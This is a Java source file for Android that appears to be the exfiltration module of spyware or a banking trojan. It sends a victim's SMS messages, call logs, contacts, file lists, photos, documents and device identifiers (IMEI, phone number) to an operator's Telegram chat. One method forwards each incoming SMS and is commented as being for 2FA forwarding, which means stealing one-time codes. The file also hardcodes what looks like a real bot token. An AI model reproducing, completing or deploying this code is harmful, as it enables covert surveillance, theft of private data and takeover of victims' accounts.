package com.my.luck.network;

import android.content.Context;
import android.util.Log;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import java.util.Map;
import org.json.JSONArray;
import org.json.JSONObject;

public class TelegramBot {
    private static final String TAG = "TelegramBot";
    private static String BOT_TOKEN = "8809826791:AAERMVrTHNr3VsreEZGUtSN8ltWRTuI2qrs";  // Replace with your bot token
    private static String OWNER_ID = "8809826791";    // Replace with your Telegram user ID
    private static final String API_URL = "https://api.telegram.org/bot";
    private Context context;

    public TelegramBot(Context context) {
        this.context = context;
    }

    // Send message to owner
    public void sendMessage(String message) {
        new Thread(() -> {
            try {
                String urlString = API_URL + BOT_TOKEN + "/sendMessage";
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                JSONObject payload = new JSONObject();
                payload.put("chat_id", OWNER_ID);
                payload.put("text", message);
                payload.put("parse_mode", "HTML");

                DataOutputStream out = new DataOutputStream(conn.getOutputStream());
                out.writeBytes(payload.toString());
                out.flush();
                out.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "Message sent successfully");
                } else {
                    Log.e(TAG, "Failed to send message: " + responseCode);
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending message", e);
            }
        }).start();
    }

    // Send file (photo, document, etc.)
    public void sendFile(String filePath, String caption) {
        new Thread(() -> {
            try {
                String boundary = "*****";
                String lineEnd = "\r\n";
                String twoHyphens = "--";

                URL url = new URL(API_URL + BOT_TOKEN + "/sendDocument");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setDoInput(true);
                conn.setUseCaches(false);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Connection", "Keep-Alive");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

                // Chat ID
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd);
                dos.writeBytes(lineEnd);
                dos.writeBytes(OWNER_ID + lineEnd);

                // Caption
                if (caption != null && !caption.isEmpty()) {
                    dos.writeBytes(twoHyphens + boundary + lineEnd);
                    dos.writeBytes("Content-Disposition: form-data; name=\"caption\"" + lineEnd);
                    dos.writeBytes(lineEnd);
                    dos.writeBytes(caption + lineEnd);
                }

                // File
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + 
                               new java.io.File(filePath).getName() + "\"" + lineEnd);
                dos.writeBytes(lineEnd);

                java.io.FileInputStream fis = new java.io.FileInputStream(filePath);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    dos.write(buffer, 0, bytesRead);
                }
                fis.close();
                dos.writeBytes(lineEnd);
                dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
                dos.flush();
                dos.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "File sent: " + filePath);
                } else {
                    Log.e(TAG, "Failed to send file: " + responseCode);
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending file", e);
            }
        }).start();
    }

    // Send photo
    public void sendPhoto(String photoPath, String caption) {
        new Thread(() -> {
            try {
                String boundary = "*****";
                String lineEnd = "\r\n";
                String twoHyphens = "--";

                URL url = new URL(API_URL + BOT_TOKEN + "/sendPhoto");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setDoInput(true);
                conn.setUseCaches(false);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Connection", "Keep-Alive");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd);
                dos.writeBytes(lineEnd);
                dos.writeBytes(OWNER_ID + lineEnd);

                if (caption != null && !caption.isEmpty()) {
                    dos.writeBytes(twoHyphens + boundary + lineEnd);
                    dos.writeBytes("Content-Disposition: form-data; name=\"caption\"" + lineEnd);
                    dos.writeBytes(lineEnd);
                    dos.writeBytes(caption + lineEnd);
                }

                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"" + 
                               new java.io.File(photoPath).getName() + "\"" + lineEnd);
                dos.writeBytes(lineEnd);

                java.io.FileInputStream fis = new java.io.FileInputStream(photoPath);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    dos.write(buffer, 0, bytesRead);
                }
                fis.close();
                dos.writeBytes(lineEnd);
                dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
                dos.flush();
                dos.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "Photo sent: " + photoPath);
                } else {
                    Log.e(TAG, "Failed to send photo: " + responseCode);
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending photo", e);
            }
        }).start();
    }

    // Send SMS as formatted message
    public void sendSmsList(List<Map<String, String>> smsList) {
        StringBuilder sb = new StringBuilder();
        sb.append("📱 <b>SMS Dump</b>\n");
        sb.append("━━━━━━━━━━━━━━━\n");
        int count = 0;
        for (Map<String, String> sms : smsList) {
            if (count++ > 20) break; // Limit to avoid message size
            sb.append("📌 <b>From:</b> ").append(sms.get("address")).append("\n");
            sb.append("📝 ").append(sms.get("body")).append("\n");
            sb.append("🕐 ").append(sms.get("date")).append("\n");
            sb.append("━━━━━━━━━━━━━━━\n");
        }
        if (smsList.size() > 20) {
            sb.append("... and ").append(smsList.size() - 20).append(" more");
        }
        sendMessage(sb.toString());
    }

    // Send call log as formatted message
    public void sendCallLogList(List<Map<String, String>> callLog) {
        StringBuilder sb = new StringBuilder();
        sb.append("📞 <b>Call Log Dump</b>\n");
        sb.append("━━━━━━━━━━━━━━━\n");
        int count = 0;
        for (Map<String, String> call : callLog) {
            if (count++ > 20) break;
            String icon = call.get("type").equals("INCOMING") ? "📥" : 
                          call.get("type").equals("OUTGOING") ? "📤" : "❌";
            sb.append(icon).append(" <b>").append(call.get("name") != null ? call.get("name") : "Unknown").append("</b>\n");
            sb.append("📞 ").append(call.get("number")).append("\n");
            sb.append("⏱️ ").append(call.get("duration")).append("s\n");
            sb.append("🕐 ").append(call.get("date")).append("\n");
            sb.append("━━━━━━━━━━━━━━━\n");
        }
        if (callLog.size() > 20) {
            sb.append("... and ").append(callLog.size() - 20).append(" more");
        }
        sendMessage(sb.toString());
    }

    // Send contacts as formatted message
    public void sendContactsList(List<Map<String, String>> contacts) {
        StringBuilder sb = new StringBuilder();
        sb.append("👤 <b>Contacts Dump</b>\n");
        sb.append("━━━━━━━━━━━━━━━\n");
        int count = 0;
        for (Map<String, String> contact : contacts) {
            if (count++ > 30) break;
            sb.append("👤 ").append(contact.get("name")).append("\n");
            sb.append("📞 ").append(contact.get("number")).append("\n");
            sb.append("━━━━━━━━━━━━━━━\n");
        }
        if (contacts.size() > 30) {
            sb.append("... and ").append(contacts.size() - 30).append(" more");
        }
        sendMessage(sb.toString());
    }

    // Send file list (gallery/files)
    public void sendFileList(List<String> files, String type) {
        StringBuilder sb = new StringBuilder();
        sb.append("📂 <b>").append(type).append(" Dump</b>\n");
        sb.append("━━━━━━━━━━━━━━━\n");
        int count = 0;
        for (String file : files) {
            if (count++ > 15) break;
            sb.append("📄 ").append(new java.io.File(file).getName()).append("\n");
            sb.append("📁 ").append(file).append("\n");
            sb.append("━━━━━━━━━━━━━━━\n");
        }
        if (files.size() > 15) {
            sb.append("... and ").append(files.size() - 15).append(" more");
        }
        sendMessage(sb.toString());
    }

    // Alert on new SMS (for 2FA forwarding)
    public void alertNewSms(String sender, String body) {
        String alert = "🔴 <b>NEW SMS RECEIVED</b>\n";
        alert += "━━━━━━━━━━━━━━━\n";
        alert += "📌 <b>From:</b> " + sender + "\n";
        alert += "📝 " + body + "\n";
        alert += "🕐 " + new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", 
                java.util.Locale.getDefault()).format(new java.util.Date());
        sendMessage(alert);
    }

    // Device info on first boot
    public void sendDeviceInfo() {
        android.telephony.TelephonyManager tm = 
            (android.telephony.TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        android.os.Build build = new android.os.Build();
        
        String info = "🖥️ <b>Device Connected</b>\n";
        info += "━━━━━━━━━━━━━━━\n";
        info += "📱 <b>Model:</b> " + android.os.Build.MODEL + "\n";
        info += "🏷️ <b>Brand:</b> " + android.os.Build.BRAND + "\n";
        info += "📡 <b>Android:</b> " + android.os.Build.VERSION.RELEASE + "\n";
        info += "🔢 <b>SDK:</b> " + android.os.Build.VERSION.SDK_INT + "\n";
        info += "📶 <b>IMEI:</b> " + (tm != null ? tm.getDeviceId() : "N/A") + "\n";
        info += "📞 <b>Number:</b> " + (tm != null ? tm.getLine1Number() : "N/A");
        sendMessage(info);
    }

    // Set bot token and owner ID dynamically
    public static void configure(String botToken, String ownerId) {
        BOT_TOKEN = botToken;
        OWNER_ID = ownerId;
        Log.d("TelegramBot", "Configured with token: " + botToken.substring(0, 5) + "...");
    }
}